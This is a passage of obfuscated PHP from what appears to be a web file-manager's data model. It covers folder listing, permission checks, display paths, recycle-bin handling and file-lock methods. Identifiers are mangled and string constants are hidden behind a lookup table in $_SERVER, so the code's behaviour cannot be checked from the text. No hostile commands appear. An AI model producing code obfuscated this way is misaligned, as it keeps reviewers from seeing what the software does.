$Îù‘•¸û[$™ê½€úÙ[90]][$™ê½€úÙ[574]] = array(); foreach ($‡“¿¿˜×[$Îù‘•¸û[$™ê½€úÙ[194]]] as $·‡§ëĞ) { $Ä°¦ÆœË = $™ê½€úÙ[575]; if ($·‡§ëĞ[$™ê½€úÙ[576]] == $™ê½€úÙ[91]) { $Ä°¦ÆœË .= $™ê½€úÙ[577]; } $Îù‘•¸û[$™ê½€úÙ[90]][$™ê½€úÙ[574]] = array_field_key($·‡§ëĞ, explode($™ê½€úÙ[50], $Ä°¦ÆœË)); } } } unset($Îù‘•¸û); return $œ¥á˜ºÉ; } protected function _listAppendChildren(&$ƒƒÔŞúü, $Ê”¾­Ï¯) { $¤•“«¦‰ =& $_SERVER[ˆö¿ÚÌ¼]; $È‹ëâ‹ = array(); $¼–©÷Éí = array($¤•“«¦‰[242] => 0, $¤•“«¦‰[243] => 0); foreach ($ƒƒÔŞúü as &$ö¥ÊÉÙ²) { if (!$ö¥ÊÉÙ²[$¤•“«¦‰[497]]) { continue; } $È‹ëâ‹[] = $ö¥ÊÉÙ²[$¤•“«¦‰[194]]; } unset($ö¥ÊÉÙ²); if (!$È‹ëâ‹) { return; } $İø·ËÈ = array($¤•“«¦‰[193] => array($¤•“«¦‰[7], $È‹ëâ‹), $¤•“«¦‰[517] => 0); $Ü¯’•¤ê = array($¤•“«¦‰[193], $¤•“«¦‰[497], $¤•“«¦‰[578] => $¤•“«¦‰[579]); $–»××„ = $this->field($Ü¯’•¤ê)->where($İø·ËÈ)->group($¤•“«¦‰[580])->select(); $æçòÉ±· = array(); foreach ($–»××„ as $åÕá¾´) { $¤Ñ‡ÑÔ = $åÕá¾´[$¤•“«¦‰[193]]; $•âå°—Ã = $åÕá¾´[$¤•“«¦‰[497]] == $¤•“«¦‰[91] ? $¤•“«¦‰[243] : $¤•“«¦‰[242]; if (!isset($æçòÉ±·[$¤Ñ‡ÑÔ])) { $æçòÉ±·[$¤Ñ‡ÑÔ] = array($¤•“«¦‰[242] => 0, $¤•“«¦‰[243] => 0); } $æçòÉ±·[$¤Ñ‡ÑÔ][$•âå°—Ã] += $åÕá¾´[$¤•“«¦‰[579]]; } foreach ($ƒƒÔŞúü as &$ö¥ÊÉÙ²) { if (!$ö¥ÊÉÙ²[$¤•“«¦‰[497]]) { continue; } $ººšÅ£‹ = is_array($æçòÉ±·[$ö¥ÊÉÙ²[$¤•“«¦‰[194]]]) ? $æçòÉ±·[$ö¥ÊÉÙ²[$¤•“«¦‰[194]]] : $¼–©÷Éí; $ö¥ÊÉÙ²[$¤•“«¦‰[243]] = $ººšÅ£‹[$¤•“«¦‰[243]]; $ö¥ÊÉÙ²[$¤•“«¦‰[242]] = $ººšÅ£‹[$¤•“«¦‰[242]]; unset($ö¥ÊÉÙ²[$¤•“«¦‰[498]]); } unset($ö¥ÊÉÙ²); } protected function _listAppendAuth(&$£©¡´¼Å) { $ş²éµ³ =& $_SERVER[ˆö¿ÚÌ¼]; $¤üæÃŒÅ = array(); foreach ($£©¡´¼Å as $¿¾í°ºÊ) { if ($¿¾í°ºÊ[$ş²éµ³[191]] == self::TYPE_GROUP) { $¤üæÃŒÅ[] = $¿¾í°ºÊ[$ş²éµ³[194]]; } } if (!$¤üæÃŒÅ) { return; } $Î×ÑÊıá = array_to_keyvalue($£©¡´¼Å, $ş²éµ³[194]); $¥íÁ¯‰ = Model($ş²éµ³[581])->getSourceList($¤üæÃŒÅ, $Î×ÑÊıá); $ îÑ‹ = KodUser::isRoot(); foreach ($£©¡´¼Å as $õö¬Ä×× => &$¿¾í°ºÊ) { $¿¾í°ºÊ[$ş²éµ³[499]] = $¥íÁ¯‰[$¿¾í°ºÊ[$ş²éµ³[194]]]; if (!$¿¾í°ºÊ[$ş²éµ³[499]] && $¿¾í°ºÊ[$ş²éµ³[191]] == self::TYPE_GROUP) { $¿¾í°ºÊ[$ş²éµ³[499]] = Action($ş²éµ³[582])->pathGroupAuthMake($¿¾í°ºÊ[$ş²éµ³[583]]); if (!$¿¾í°ºÊ[$ş²éµ³[499]] && !$ îÑ‹) { $¿¾í°ºÊ[$ş²éµ³[236]] = !1; $¿¾í°ºÊ[$ş²éµ³[235]] = !1; } } if ($¿¾í°ºÊ[$ş²éµ³[499]]) { $¿¾í°ºÊ[$ş²éµ³[236]] = AuthModel::authCheckEdit($¿¾í°ºÊ[$ş²éµ³[499]][$ş²éµ³[500]]); $¿¾í°ºÊ[$ş²éµ³[235]] = AuthModel::authCheckView($¿¾í°ºÊ[$ş²éµ³[499]][$ş²éµ³[500]]); } $this->groupPathDisplay($¿¾í°ºÊ); } unset($¿¾í°ºÊ); } public function _listAppendAuthSecret(&$ªÌ·‚ÃÕ) { $¢˜Ü¤»± =& $_SERVER[ˆö¿ÚÌ¼]; if (Model($¢˜Ü¤»±[520])->get($¢˜Ü¤»±[584]) != $¢˜Ü¤»±[91]) { return; } static $·¨øÑ›© = false; if (!$·¨øÑ›©) { $»Ö‚²²… = Model($¢˜Ü¤»±[585]); $ïúºøÓÀ = Model($¢˜Ü¤»±[586]); $·¨øÑ›© = $ïúºøÓÀ->listData(); $·¨øÑ›© = array_to_keyvalue($·¨øÑ›©, $¢˜Ü¤»±[194]); $ÀÒ¦ú« = json_decode(Model($¢˜Ü¤»±[520])->get($¢˜Ü¤»±[587]), !0); $ÀÒ¦ú« = array_to_keyvalue($ÀÒ¦ú«, $¢˜Ü¤»±[478]); foreach ($·¨øÑ›© as $Ä••Ô­¬ => $»Šõ‰ë) { $‡Çœ§Ïı = $ÀÒ¦ú«[$»Šõ‰ë[$¢˜Ü¤»±[588]]]; if (!$‡Çœ§Ïı) { $ïúºøÓÀ->remove($»Šõ‰ë[$¢˜Ü¤»±[478]]); unset($·¨øÑ›©[$Ä••Ô­¬]); continue; } $Ë›ÒÔ¥® = $»Ö‚²²…->listData($‡Çœ§Ïı[$¢˜Ü¤»±[499]]); if (!$Ë›ÒÔ¥®) { $ïúºøÓÀ->remove($»Šõ‰ë[$¢˜Ü¤»±[478]]); unset($·¨øÑ›©[$Ä••Ô­¬]); continue; } $»Šõ‰ë[$¢˜Ü¤»±[499]] = $Ë›ÒÔ¥®; $»Šõ‰ë[$¢˜Ü¤»±[589]] = $‡Çœ§Ïı; $»Šõ‰ë[$¢˜Ü¤»±[590]] = Model($¢˜Ü¤»±[591])->getInfoSimpleOuter($»Šõ‰ë[$¢˜Ü¤»±[539]]); $·¨øÑ›©[$Ä••Ô­¬] = $»Šõ‰ë; } } $»ŒğŠ² = USER_ID; $˜šœ‹ï‡ = array(); $›ÙÒåª“ = $this->_listAppendPath($˜šœ‹ï‡, !0); foreach ($ªÌ·‚ÃÕ as $Ä••Ô­¬ => &$»Šõ‰ë) { if (!is_array($»Šõ‰ë[$¢˜Ü¤»±[499]])) { continue; } if ($»Šõ‰ë[$¢˜Ü¤»±[191]] != $¢˜Ü¤»±[592]) { continue; } if (isset($·¨øÑ›©[$»Šõ‰ë[$¢˜Ü¤»±[194]]])) { $ÆƒÕÈÁ = $·¨øÑ›©[$»Šõ‰ë[$¢˜Ü¤»±[194]]]; if (!is_array($»Šõ‰ë[$¢˜Ü¤»±[553]])) { $»Šõ‰ë[$¢˜Ü¤»±[553]] = array(); } $»Šõ‰ë[$¢˜Ü¤»±[553]][$¢˜Ü¤»±[593]] = $ÆƒÕÈÁ[$¢˜Ü¤»±[588]]; $»Šõ‰ë[$¢˜Ü¤»±[499]][$¢˜Ü¤»±[594]] = $ÆƒÕÈÁ; $»Šõ‰ë[$¢˜Ü¤»±[499]][$¢˜Ü¤»±[595]] = $»Šõ‰ë[$¢˜Ü¤»±[596]]; $»Šõ‰ë[$¢˜Ü¤»±[499]][$¢˜Ü¤»±[597]] = $¢˜Ü¤»±[91]; if ($ÆƒÕÈÁ[$¢˜Ü¤»±[539]] != $»ŒğŠ²) { $»Šõ‰ë[$¢˜Ü¤»±[499]][$¢˜Ü¤»±[500]] = $»Šõ‰ë[$¢˜Ü¤»±[499]][$¢˜Ü¤»±[500]] & $ÆƒÕÈÁ[$¢˜Ü¤»±[499]][$¢˜Ü¤»±[499]]; } continue; } $ŞíÈûƒ = $this->parentLevelArray($»Šõ‰ë[$¢˜Ü¤»±[598]]); $®óÌŒ³Ï = array_reverse($ŞíÈûƒ); foreach ($®óÌŒ³Ï as $ò·º¹€£ => $Çˆ£×Ö) { if (!isset($·¨øÑ›©[$Çˆ£×Ö])) { continue; } $ÆƒÕÈÁ = $·¨øÑ›©[$Çˆ£×Ö]; $»Šõ‰ë[$¢˜Ü¤»±[499]][$¢˜Ü¤»±[594]] = $ÆƒÕÈÁ; if ($ÆƒÕÈÁ[$¢˜Ü¤»±[539]] != $»ŒğŠ²) { $»Šõ‰ë[$¢˜Ü¤»±[499]][$¢˜Ü¤»±[500]] = $»Šõ‰ë[$¢˜Ü¤»±[499]][$¢˜Ü¤»±[500]] & $ÆƒÕÈÁ[$¢˜Ü¤»±[499]][$¢˜Ü¤»±[499]]; } $µ·Õ‰•œ = $¢˜Ü¤»±[12]; $†ôŒ—¶ú = count($ŞíÈûƒ) - $ò·º¹€£; for ($°òó¿Ëõ = 0; $°òó¿Ëõ < $†ôŒ—¶ú; $°òó¿Ëõ++) { if (!isset($›ÙÒåª“[$ŞíÈûƒ[$°òó¿Ëõ]])) { $µ·Õ‰•œ = $¢˜Ü¤»±[12]; break; } $µ·Õ‰•œ = $µ·Õ‰•œ . rtrim($›ÙÒåª“[$ŞíÈûƒ[$°òó¿Ëõ]], $¢˜Ü¤»±[8]) . $¢˜Ü¤»±[8]; } $»Šõ‰ë[$¢˜Ü¤»±[499]][$¢˜Ü¤»±[595]] = rtrim($µ·Õ‰•œ, $¢˜Ü¤»±[8]) . $¢˜Ü¤»±[8]; break; } } unset($»Šõ‰ë); } public function groupPathDisplay(&$Š©ßÑà) { $¬‚„ó©ê =& $_SERVER[ˆö¿ÚÌ¼]; if ($Š©ßÑà[$¬‚„ó©ê[191]] != self::TYPE_GROUP) { return; } $–çüÃ¤— = Model($¬‚„ó©ê[599])->getInfo($Š©ßÑà[$¬‚„ó©ê[583]]); $Âû­¿Ü = $this->parentLevelArray($–çüÃ¤—[$¬‚„ó©ê[598]]); $…Á² = $¬‚„ó©ê[12]; foreach ($Âû­¿Ü as $™®ö®½Ê) { $Ã¡ÍÙŸ˜ = Model($¬‚„ó©ê[599])->getInfo($™®ö®½Ê); $…Á² .= $Ã¡ÍÙŸ˜[$¬‚„ó©ê[90]][$¬‚„ó©ê[194]] . $¬‚„ó©ê[50]; } $Š©ßÑà[$¬‚„ó©ê[600]] = $–çüÃ¤—[$¬‚„ó©ê[193]]; $Š©ßÑà[$¬‚„ó©ê[601]] = $–çüÃ¤—[$¬‚„ó©ê[598]]; $Š©ßÑà[$¬‚„ó©ê[602]] = $–çüÃ¤—[$¬‚„ó©ê[603]]; $Š©ßÑà[$¬‚„ó©ê[604]] = $…Á² . $–çüÃ¤—[$¬‚„ó©ê[90]][$¬‚„ó©ê[194]]; } protected function _listAppendPath(&$°´æ»Ó•, $ÖÉ¬àÅú = false) { $›ÉÒÄÂÃ =& $_SERVER[ˆö¿ÚÌ¼]; static $à€©ÍµÜ = array(); $ŒÜ‡É”ò = array(); $—±ÁŸÚı = array(); if ($ÖÉ¬àÅú) { return $à€©ÍµÜ; } foreach ($°´æ»Ó• as &$ÈŒ ­ï„) { $Çùàœ® = $ÈŒ ­ï„[$›ÉÒÄÂÃ[194]]; if ($ÈŒ ­ï„[$›ÉÒÄÂÃ[497]] == $›ÉÒÄÂÃ[91] && $ÈŒ ­ï„[$›ÉÒÄÂÃ[193]] != 0) { $à€©ÍµÜ[$Çùàœ®] = $ÈŒ ­ï„[$›ÉÒÄÂÃ[32]]; } if ($ÈŒ ­ï„[$›ÉÒÄÂÃ[497]] == $›ÉÒÄÂÃ[91] && $ÈŒ ­ï„[$›ÉÒÄÂÃ[193]] == 0) { $à€©ÍµÜ[$Çùàœ®] = $this->_listAppendPathRoot($ÈŒ ­ï„, array()); } if (isset($—±ÁŸÚı[$ÈŒ ­ï„[$›ÉÒÄÂÃ[598]]])) { continue; } $—±ÁŸÚı[$ÈŒ ­ï„[$›ÉÒÄÂÃ[598]]] = !0; $Ğ¾µÄÕ = $this->parentLevelArray($ÈŒ ­ï„[$›ÉÒÄÂÃ[598]]); foreach ($Ğ¾µÄÕ as $é©ŒÂº¨ => $×°àíÈ) { if (isset($à€©ÍµÜ[$×°àíÈ])) { continue; } if ($é©ŒÂº¨ == 0) { $à€©ÍµÜ[$×°àíÈ] = $this->_listAppendPathRoot($ÈŒ ­ï„, $Ğ¾µÄÕ); } if ($é©ŒÂº¨ != 0) { $ŒÜ‡É”ò[] = $×°àíÈ; } } } unset($ÈŒ ­ï„); $ŒÜ‡É”ò = array_unique($ŒÜ‡É”ò); if (count($ŒÜ‡É”ò) > 0) { $¾¬†›ºî = array($›ÉÒÄÂÃ[503] => array($›ÉÒÄÂÃ[504], $ŒÜ‡É”ò)); if (count($ŒÜ‡É”ò) == 1) { $Æ¼Õ¿ÍÑ = $this->sourceInfo($ŒÜ‡É”ò[0]); $ÌÖ¿Ç¼Š = is_array($Æ¼Õ¿ÍÑ) ? array($Æ¼Õ¿ÍÑ) : !1; } else { $ÌÖ¿Ç¼Š = $this->field($›ÉÒÄÂÃ[605])->where($¾¬†›ºî)->select(); } if (!$ÌÖ¿Ç¼Š) { $ÌÖ¿Ç¼Š = array(); } foreach ($ÌÖ¿Ç¼Š as $ÙªŸï­á) { $à€©ÍµÜ[$ÙªŸï­á[$›ÉÒÄÂÃ[194]]] = $ÙªŸï­á[$›ÉÒÄÂÃ[32]]; } } $æ½ƒç”î = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $Ñ—–¸ø© = array(); foreach ($°´æ»Ó• as &$ÈŒ ­ï„) { $Ö™•÷âÄ = $ÈŒ ­ï„[$›ÉÒÄÂÃ[598]]; $ÈİÓ×Ì¦ = $›ÉÒÄÂÃ[12]; if (isset($Ñ—–¸ø©[$Ö™•÷âÄ])) { $ÈİÓ×Ì¦ = $Ñ—–¸ø©[$Ö™•÷âÄ]; } else { $Ğ¾µÄÕ = $this->parentLevelArray($ÈŒ ­ï„[$›ÉÒÄÂÃ[598]]); foreach ($Ğ¾µÄÕ as $é©ŒÂº¨ => $×°àíÈ) { if (isset($à€©ÍµÜ[$×°àíÈ])) { $ÈİÓ×Ì¦ .= $à€©ÍµÜ[$×°àíÈ] . $›ÉÒÄÂÃ[8]; } } $Ñ—–¸ø©[$Ö™•÷âÄ] = $ÈİÓ×Ì¦; } $ÈİÓ×Ì¦ .= $ÈŒ ­ï„[$›ÉÒÄÂÃ[32]]; if ($ÈŒ ­ï„[$›ÉÒÄÂÃ[497]] == $›ÉÒÄÂÃ[91]) { $ÈİÓ×Ì¦ .= $›ÉÒÄÂÃ[8]; } $ÈŒ ­ï„[$›ÉÒÄÂÃ[596]] = str_replace($›ÉÒÄÂÃ[257], $›ÉÒÄÂÃ[8], $ÈİÓ×Ì¦); if ($ÈŒ ­ï„[$›ÉÒÄÂÃ[193]] == $›ÉÒÄÂÃ[231]) { $ÈŒ ­ï„[$›ÉÒÄÂÃ[32]] = trim($à€©ÍµÜ[$ÈŒ ­ï„[$›ÉÒÄÂÃ[194]]], $›ÉÒÄÂÃ[8]); $ÈŒ ­ï„[$›ÉÒÄÂÃ[596]] = $ÈŒ ­ï„[$›ÉÒÄÂÃ[32]] . $›ÉÒÄÂÃ[8]; } if (intval($ÈŒ ­ï„[$›ÉÒÄÂÃ[191]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($ÈŒ ­ï„, $Ğ¾µÄÕ, $æ½ƒç”î); } } unset($ÈŒ ­ï„); return $°´æ»Ó•; } private function _listAppendPathRecycle(&$Ë‚•˜¾, $ÃÜšÏâ‹, $ù¹í²×ş) { $«î Ü¤­ =& $_SERVER[ˆö¿ÚÌ¼]; if (!in_array($ù¹í²×ş, $ÃÜšÏâ‹) && $Ë‚•˜¾[$«î Ü¤­[194]] != $ù¹í²×ş) { return; } $Û›Ôô¢È = explode($«î Ü¤­[8], trim($Ë‚•˜¾[$«î Ü¤­[596]], $«î Ü¤­[8])); $ÄÏİ°Í = implode($«î Ü¤­[8], array_slice($Û›Ôô¢È, 2)); $Ë‚•˜¾[$«î Ü¤­[596]] = $«î Ü¤­[8] . LNG($«î Ü¤­[606]) . $«î Ü¤­[8] . ltrim($ÄÏİ°Í, $«î Ü¤­[8]); $Ë‚•˜¾[$«î Ü¤­[598]] = $«î Ü¤­[607] . implode($«î Ü¤­[50], array_slice($ÃÜšÏâ‹, 1)) . $«î Ü¤­[50]; if ($Ë‚•˜¾[$«î Ü¤­[194]] == $ù¹í²×ş) { $Ë‚•˜¾[$«î Ü¤­[598]] = $«î Ü¤­[607]; $Ë‚•˜¾[$«î Ü¤­[193]] = $«î Ü¤­[231]; $Ë‚•˜¾[$«î Ü¤­[32]] = LNG($«î Ü¤­[606]); } $Ë‚•˜¾[$«î Ü¤­[608]] = $«î Ü¤­[609]; } protected function _listAppendPathRoot(&$Üí‡šÄÍ, $ÇĞè½›€) { $Äƒã«”š =& $_SERVER[ˆö¿ÚÌ¼]; static $åÃ‹şÀÕ = false; static $”ƒ‹¦•î = false; $­É‚ğÃÃ = $Äƒã«”š[12]; if ($Üí‡šÄÍ[$Äƒã«”š[191]] == self::TYPE_USER) { if ($Üí‡šÄÍ[$Äƒã«”š[583]] == USER_ID) { $­É‚ğÃÃ = LNG($Äƒã«”š[610]); if ($åÃ‹şÀÕ === !1) { $¼£‚˜¥ = Model($Äƒã«”š[611])->getInfoFull(USER_ID); $åÃ‹şÀÕ = _get($¼£‚˜¥, $Äƒã«”š[612], $Äƒã«”š[12]); } if ($”ƒ‹¦•î === !1) { $¼£‚˜¥ = Model($Äƒã«”š[611])->getInfoFull(USER_ID); $”ƒ‹¦•î = _get($¼£‚˜¥, $Äƒã«”š[613], $Äƒã«”š[12]); } if ($ÇĞè½›€ && $ÇĞè½›€[0] == $åÃ‹şÀÕ || !$ÇĞè½›€ && $Üí‡šÄÍ[$Äƒã«”š[194]] == $åÃ‹şÀÕ) { $­É‚ğÃÃ = LNG($Äƒã«”š[614]); $Üí‡šÄÍ[$Äƒã«”š[615]] = $Äƒã«”š[616]; } if ($ÇĞè½›€ && $ÇĞè½›€[0] == $”ƒ‹¦•î || !$ÇĞè½›€ && $Üí‡šÄÍ[$Äƒã«”š[194]] == $”ƒ‹¦•î) { $­É‚ğÃÃ = $­É‚ğÃÃ . $Äƒã«”š[617] . LNG($Äƒã«”š[618]); } if (!$ÇĞè½›€) { $Üí‡šÄÍ[$Äƒã«”š[32]] = $­É‚ğÃÃ; } } else { $¼£‚˜¥ = Model($Äƒã«”š[611])->getInfoFull($Üí‡šÄÍ[$Äƒã«”š[583]]); $õØ°§²Œ = _get($¼£‚˜¥, $Äƒã«”š[613], $Äƒã«”š[12]); $Üí‡šÄÍ[$Äƒã«”š[619]] = Model($Äƒã«”š[591])->getInfoSimpleOuter($Üí‡šÄÍ[$Äƒã«”š[583]]); $­É‚ğÃÃ = LNG($Äƒã«”š[620]) . $Äƒã«”š[176] . $Üí‡šÄÍ[$Äƒã«”š[619]][$Äƒã«”š[32]] . $Äƒã«”š[178]; if ($ÇĞè½›€ && $ÇĞè½›€[0] == $õØ°§²Œ || !$ÇĞè½›€ && $Üí‡šÄÍ[$Äƒã«”š[194]] == $õØ°§²Œ) { $­É‚ğÃÃ = LNG($Äƒã«”š[620]) . $Äƒã«”š[621] . $Üí‡šÄÍ[$Äƒã«”š[619]][$Äƒã«”š[32]] . $Äƒã«”š[617] . LNG($Äƒã«”š[618]) . $Äƒã«”š[178]; } } } else { if ($Üí‡šÄÍ[$Äƒã«”š[191]] == self::TYPE_GROUP) { $…äÉ¦¿‰ = Model($Äƒã«”š[599])->getInfoSimple($Üí‡šÄÍ[$Äƒã«”š[583]]); $­É‚ğÃÃ = $…äÉ¦¿‰[$Äƒã«”š[32]]; } else { if ($Üí‡šÄÍ[$Äƒã«”š[191]] == self::TYPE_SYSTEM) { $­É‚ğÃÃ = $Äƒã«”š[622]; } } } $­É‚ğÃÃ = $­É‚ğÃÃ ? $Äƒã«”š[8] . $­É‚ğÃÃ . $Äƒã«”š[8] : $Äƒã«”š[8]; return $­É‚ğÃÃ; } protected function _listAppendUser(&$¨ìíïß¤) { $ÍãÑ™Û‡ =& $_SERVER[ˆö¿ÚÌ¼]; $Èå˜ì¸¼ = array_to_keyvalue($¨ìíïß¤, $ÍãÑ™Û‡[12], $ÍãÑ™Û‡[539]); $³…î¼­‹ = array_to_keyvalue($¨ìíïß¤, $ÍãÑ™Û‡[12], $ÍãÑ™Û‡[541]); $ş™Ù™¥ = array_merge($Èå˜ì¸¼, $³…î¼­‹); $ÂĞÒúÓÓ = Model($ÍãÑ™Û‡[611])->userListInfo($ş™Ù™¥); foreach ($¨ìíïß¤ as &$ÁŸèäßÛ) { $—ÔÕïö = $ÁŸèäßÛ[$ÍãÑ™Û‡[539]]; $ÁŸèäßÛ[$ÍãÑ™Û‡[539]] = $ÂĞÒúÓÓ[$—ÔÕïö] ? $ÂĞÒúÓÓ[$—ÔÕïö] : !1; $—ÔÕïö = $ÁŸèäßÛ[$ÍãÑ™Û‡[541]]; $ÁŸèäßÛ[$ÍãÑ™Û‡[541]] = $ÂĞÒúÓÓ[$—ÔÕïö] ? $ÂĞÒúÓÓ[$—ÔÕïö] : !1; if (_get($ÁŸèäßÛ, $ÍãÑ™Û‡[623], 0)) { $½¢×¬ïá = $GLOBALS[$ÍãÑ™Û‡[6]][$ÍãÑ™Û‡[92]][$ÍãÑ™Û‡[624]]; if ($ÁŸèäßÛ[$ÍãÑ™Û‡[553]][$ÍãÑ™Û‡[625]] <= time() - $½¢×¬ïá) { $this->metaSet($ÁŸèäßÛ[$ÍãÑ™Û‡[194]], $ÍãÑ™Û‡[626], null); $this->metaSet($ÁŸèäßÛ[$ÍãÑ™Û‡[194]], $ÍãÑ™Û‡[625], null); unset($ÁŸèäßÛ[$ÍãÑ™Û‡[553]][$ÍãÑ™Û‡[626]]); continue; } $ğö£óè‡ = $ÁŸèäßÛ[$ÍãÑ™Û‡[553]][$ÍãÑ™Û‡[626]]; $ÁŸèäßÛ[$ÍãÑ™Û‡[553]][$ÍãÑ™Û‡[627]] = Model($ÍãÑ™Û‡[611])->getInfoSimpleOuter($ğö£óè‡); } } unset($ÁŸèäßÛ); } public function parentLevelArray($‘º¦ğ‚) { $„âÙŠ¨Ö =& $_SERVER[ˆö¿ÚÌ¼]; $‘º¦ğ‚ = explode($„âÙŠ¨Ö[50], trim($‘º¦ğ‚, $„âÙŠ¨Ö[50])); return array_remove_value($‘º¦ğ‚, $„âÙŠ¨Ö[231]); } public function listAll($ìËñŠ‹ì) { $¥—ÈéÎï =& $_SERVER[ˆö¿ÚÌ¼]; $åÈâàÙ = $this->sourceInfo($ìËñŠ‹ì); $ƒõÖäğ™ = array($¥—ÈéÎï[628] => array($¥—ÈéÎï[629], $åÈâàÙ[$¥—ÈéÎï[598]] . $ìËñŠ‹ì . $¥—ÈéÎï[630]), $¥—ÈéÎï[631] => 0); $¤ÎóÒÓó = $¥—ÈéÎï[632]; $…¶Èª´› = "\114\105\x46\124\40\112\x4f\x49\116\x20{$this->tablePrefix}\151\157\x5f\x66\x69\x6c\x65\40\146\x69\x6c\145\x20\157\156\x20\x73\x6f\165\x72\143\x65\56\146\x69\154\145\111\104\40\75\x20\146\x69\154\x65\56\146\x69\154\145\111\x44"; $öµºğÒø = $this->alias($¥—ÈéÎï[531])->field($¤ÎóÒÓó)->where($ƒõÖäğ™)->join($…¶Èª´›)->select(); $this->_listAppendAuth($öµºğÒø); $this->_listAppendUser($öµºğÒø); $this->_listAppendPath($öµºğÒø); $öµºğÒø = array_to_keyvalue($öµºğÒø, $¥—ÈéÎï[194]); $€¯‚ú¿… = "\x2f{$åÈâàÙ[$¥—ÈéÎï[32]]}\57"; $€¯‚ú¿… = $€¯‚ú¿… == $¥—ÈéÎï[257] ? $¥—ÈéÎï[8] : $€¯‚ú¿…; $ÑÇ¯™äš = array(); foreach ($öµºğÒø as $œĞ¬Å£É => $Ù¯˜Èƒï) { $è•¥ˆÕ = $this->parentLevelArray($Ù¯˜Èƒï[$¥—ÈéÎï[598]]); array_shift($è•¥ˆÕ); $™˜¹òÄî = $€¯‚ú¿…; for ($‡Şï‘ô = 0; $‡Şï‘ô < count($è•¥ˆÕ); $‡Şï‘ô++) { $™˜¹òÄî .= $öµºğÒø[$è•¥ˆÕ[$‡Şï‘ô]][$¥—ÈéÎï[32]] . $¥—ÈéÎï[8]; } $™˜¹òÄî .= $Ù¯˜Èƒï[$¥—ÈéÎï[32]]; if ($Ù¯˜Èƒï[$¥—ÈéÎï[497]]) { $™˜¹òÄî .= $¥—ÈéÎï[8]; } $şç—çƒÌ = array($¥—ÈéÎï[507] => str_replace($¥—ÈéÎï[257], $¥—ÈéÎï[8], str_replace($¥—ÈéÎï[257], $¥—ÈéÎï[8], str_replace($¥—ÈéÎï[257], $¥—ÈéÎï[8], $™˜¹òÄî))), $¥—ÈéÎï[633] => intval($Ù¯˜Èƒï[$¥—ÈéÎï[497]]), $¥—ÈéÎï[634] => intval($Ù¯˜Èƒï[$¥—ÈéÎï[79]]), $¥—ÈéÎï[88] => intval($Ù¯˜Èƒï[$¥—ÈéÎï[88]]), $¥—ÈéÎï[90] => $this->pathInfoFilter($Ù¯˜Èƒï)); if (!$şç—çƒÌ[$¥—ÈéÎï[497]]) { $şç—çƒÌ[$¥—ÈéÎï[555]] = $Ù¯˜Èƒï[$¥—ÈéÎï[555]]; } $ÑÇ¯™äš[] = $şç—çƒÌ; } $ÑÇ¯™äš = array_sort_by($ÑÇ¯™äš, $¥—ÈéÎï[87]); return $ÑÇ¯™äš; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($™ÅÑù·Ò) { $±îí¡İ‚ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$this->allowLock()) { return; } $this->_lockCheck($±îí¡İ‚[635], $™ÅÑù·Ò); $¿§ĞÄ÷û = 1; $this->_lockEvent($™ÅÑù·Ò, array($±îí¡İ‚[636], $±îí¡İ‚[637]), $¿§ĞÄ÷û); $this->_lockParent($™ÅÑù·Ò, array($±îí¡İ‚[637]), $¿§ĞÄ÷û); $this->_lockEvent($™ÅÑù·Ò, array($±îí¡İ‚[638], $±îí¡İ‚[639]), $¿§ĞÄ÷û); $this->_lockCheckEnd($±îí¡İ‚[635], $™ÅÑù·Ò); } public function lockCopyEnd($¸û¿ô†¥) { $­â€îöğ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$this->allowLock()) { return; } $õ×ñˆßå = 0; $this->_lockEvent($¸û¿ô†¥, array($­â€îöğ[636], $­â€îöğ[637]), $õ×ñˆßå); $this->_lockParent($¸û¿ô†¥, array($­â€îöğ[637]), $õ×ñˆßå); $this->_lockEvent($¸û¿ô†¥, array($­â€îöğ[638], $­â€îöğ[639]), $õ×ñˆßå); } public function lockWriteStart($ó®É•õø, $Ñè…¾Ò = '') { $¨²‚üİÎ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$this->allowLock()) { return; } $this->_lockCheck($¨²‚üİÎ[636], $ó®É•õø); $ğğ¶ñÌÚ = 1; $this->_lockKey($¨²‚üİÎ[640] . $ó®É•õø . $¨²‚üİÎ[10] . $Ñè…¾Ò, $ğğ¶ñÌÚ); $this->_lockEvent($ó®É•õø, array($¨²‚üİÎ[635], $¨²‚üİÎ[637]), $ğğ¶ñÌÚ); $this->_lockParent($ó®É•õø, array($¨²‚üİÎ[635], $¨²‚üİÎ[637]), $ğğ¶ñÌÚ); $this->_lockCheckEnd($¨²‚üİÎ[636], $ó®É•õø); } public function lockWriteEnd($½¥¿´¼è, $ªş‰…ÅÃ = '') { $Ûğí«ºæ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$this->allowLock()) { return; } $Ò»÷£ş¡ = 0; $this->_lockKey($Ûğí«ºæ[640] . $½¥¿´¼è . $Ûğí«ºæ[10] . $ªş‰…ÅÃ, $Ò»÷£ş¡); $this->_lockEvent($½¥¿´¼è, array($Ûğí«ºæ[635], $Ûğí«ºæ[637]), $Ò»÷£ş¡); $this->_lockParent($½¥¿´¼è, array($Ûğí«ºæ[635], $Ûğí«ºæ[637]), $Ò»÷£ş¡); } public function lockMoveStart($¾ùå©ëø) { $‚îáüëÏ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$this->allowLock()) { return; } $this->_lockCheck($‚îáüëÏ[637], $¾ùå©ëø); $‹İÎò÷« = 1; $this->_lockKey($‚îáüëÏ[641] . $¾ùå©ëø, $‹İÎò÷«); $this->_lockEvent($¾ùå©ëø, array($‚îáüëÏ[635], $‚îáüëÏ[636]), $‹İÎò÷«); $this->_lockParent($¾ùå©ëø, array($‚îáüëÏ[635], $‚îáüëÏ[637]), $‹İÎò÷«); $this->_lockEvent($¾ùå©ëø, array($‚îáüëÏ[642], $‚îáüëÏ[638], $‚îáüëÏ[639]), $‹İÎò÷«); $this->_lockCheckEnd($‚îáüëÏ[637], $¾ùå©ëø); } public function lockMoveEnd($÷õ¢½‚Æ) { $£ÈÇˆ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$this->allowLock()) { return; } $¬Åï‹ñ° = 0; $this->_lockKey($£ÈÇˆ[641] . $÷õ¢½‚Æ, $¬Åï‹ñ°); $this->_lockEvent($÷õ¢½‚Æ, array($£ÈÇˆ[635], $£ÈÇˆ[636]), $¬Åï‹ñ°); 